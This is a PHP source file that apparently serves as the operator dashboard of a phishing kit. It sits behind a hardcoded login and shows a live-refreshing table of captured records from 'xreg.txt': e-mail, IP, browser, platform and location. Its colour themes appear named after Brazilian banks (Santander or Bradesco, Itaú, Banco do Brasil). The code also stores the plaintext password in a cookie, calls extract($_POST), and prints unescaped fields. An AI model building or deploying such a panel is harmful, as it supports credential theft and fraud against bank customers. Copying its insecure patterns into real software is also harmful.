<?php

$Login = "iv";
$Senha = "gogogo";

if($_GET['logout']=="sim") {
	$tempo_cookie = "360000"; // tempo de vida do cookie
	setcookie("log", "", time()+($tempo_cookie));
	setcookie("sen", "", time()+($tempo_cookie));
	echo "<script>
	alert('Deslogado');
	location.href='?';
	</script>";
	exit;
}

if(isset($_POST['loga'])) {
	extract($_POST);
	if($login=="$Login" && $senha=="$Senha") {
		$tempo_cookie = "360000"; // tempo de vida do cookie
		setcookie("log", "$Login", time()+($tempo_cookie));
		setcookie("sen", "$Senha", time()+($tempo_cookie));
		echo "<script>
		alert('Logado');
		location.href='?';
		</script>";
	} else {
		echo "<script>
		alert('Dados inválidos');
		location.href='?';
		</script>";
	}
}

if($_COOKIE['log']!="$Login" && $_COOKIE['sen']!="$Senha") {
	echo "<script type='text/javascript'> document.title = 'Login > Painel de bloqueio' </script><center><p />Autenticar<p /><form action='?' method='POST'>
	<input type='text' name='login' value=''><br />
	<input type='password' name='senha' value=''><p />
	<input type='submit' name='loga' value='Login'>
	</form></center>";
	exit;
}
?>

<?php 

if (!file_exists("xreg.txt"))
{exit("!! ERRO !! xreg.txt n&#227;o encontrado!");}

if (!isset($_GET['t'])) { $i = 0; } else { $i = $_GET['t']; }
if (!$i) { $i = 3; }
switch ($i) {
   case 0: //santa ou desk
         $cnormal = "#33000B";
		 $chover = "#B40404";
		 $ctable = "#eeeeee";
		 $cfundo = "#8A0808";
		 break;
   case 1: //dark azul
         $cnormal = "#003333";
		 $chover = "#002424";
		 $ctable = "#eeeeee";
		 $cfundo = "#001229";
         break;
   case 2: //ita
         $cnormal = "#513500";
		 $chover = "#FF8000";
		 $ctable = "#eeeeee";
		 $cfundo = "#DF7401";
		 break;
   case 3: //bb
         $cnormal = "#011046";
		 $chover = "#084B8A";
		 $ctable = "#eeeeee";
		 $cfundo = "#FFBF00";
		 break;
}

$registos = file("xreg.txt");
$linha    = @count($registos);
echo '<html><head>
<meta http-equiv="refresh" content="5;URL=">
<meta charset="utf-8">
<title>Total: '.$linha.' - by IV</title>
<script type="text/javascript">
    var TableBackgroundNormalColor = "'.$cnormal.'";
    var TableBackgroundMouseoverColor = "'.$chover.'";
    function ChangeBackgroundColor(row) {
        row.style.backgroundColor = TableBackgroundMouseoverColor;
    }

    function RestoreBackgroundColor(row) {
        row.style.backgroundColor = TableBackgroundNormalColor;
    }
</script>
</head><body style="background:'.$cfundo.';color:#FFFFFF; text-decoration:none; font-weight:normal; font-family:Consolas; font-size:15px;"><h2><center><b>Total: '.$linha.'</b></h2><hr />';
echo '<table width="100%" style="background: #0;border:0px solid #49373A"; align="center">';

echo '<tr>
      <th><font color="white"> Data </font></th>
      <th><font color="white"> Hora  </font></th>
      <th><font color="white"> Plataforma  </font></th>
      <th><font color="white"> E-mail </font></th>
      <th><font color="white"> IP </font></th>
      <th><font color="white"> Navegador </font></th>
      <th><font color="white"> Localidade </th>
     </tr>';

for ($i = $linha-1; $i >= 0; $i--) {

$resultado = @explode("**",$registos[$i]);

$resultado[4] = @eregi_replace('(((f|ht){1}tp://)[-a-zA-Z0-9@:%_\+.~#?&//=]+)',
                               '<a target="_blank" href="\\1">\\1</a>',
                        $resultado[4]);
                        
$resultado[4] = @eregi_replace('([[:space:]()[{}])(www.[-a-zA-Z0-9@:%_\+.~#?&//=]+)',
                               '\\1<a target="_blank" href="http://\\2">\\2</a>',
                        $resultado[4]);

$navx = trim($resultado[5]);
if (strlen($resultado[5]) > 8) { $navy = explode(" ",$navx); $navx = '<span style="font-size:10px;">'.$navy[0].'</span>'; }
$data 		= trim($resultado[0]);
$hora 		= trim($resultado[1]);
$plataforma = trim($resultado[2]);
$email 		= trim($resultado[3]);
$ip 		= trim($resultado[4]);
if (strlen($ip) > 59) { $ipy = explode(" ", $ip); $ip = $ipy[1]; }
$localy 	= str_replace("Rio Grande do Sul","RS",str_replace("Rio de Janeiro", "RJ",str_replace("Sao Paulo", "SP",str_replace("Santa Catarina","SC",str_replace("Brazil", "BR", trim($resultado[6]))))));
$local		= str_replace("Mato Grosso", "MT",str_replace("Pernambuco", "PE",str_replace("Mato Grosso do Sul", "MS", str_replace("Federal District", "DF", str_replace("Rio Grande do Norte", "RN", str_replace("Minas Gerais", "MG",$localy))))));

echo "<tr onmouseover=\"ChangeBackgroundColor(this)\" onmouseout=\"RestoreBackgroundColor(this)\" style=\"color:$ctable; background:$cnormal; font-weight: normal; font-size:13px;\">
        <td align=\"center\" width=\"9%\" >$data</td>
        <td align=\"center\" width=\"5%\" >$hora</td>
        <td align=\"center\" width=\"9%\" >$plataforma</td>
        <td align=\"center\" width=\"12%\" >$email</td>
	<td align=\"center\" width=\"33%\" ><span style=\"font-size:12px;\">$ip</span></td>
        <td align=\"center\" width=\"10%\" >$navx</td>
        <td align=\"center\" width=\"22%\" ><span style=\"font-size:12px;\">$local</span></td>
      </tr>";
}

echo "</table></center></body></html>\n";
?>                               